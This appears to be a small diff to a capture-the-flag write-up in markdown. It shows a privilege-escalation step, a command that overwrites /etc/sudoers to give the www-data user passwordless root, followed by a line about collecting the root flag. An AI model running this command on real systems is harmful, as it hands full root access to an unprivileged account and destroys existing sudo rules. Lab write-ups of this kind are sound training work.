@@ -221,4 +221,5 @@ echo 'www-data ALL=(root) NOPASSWD: ALL' > /etc/sudoers
 ```
 
 ![](attachments/Pasted%20image%2020250203233247.png)
+
 With this privesc, we can now find the root flag in /root and we are done.
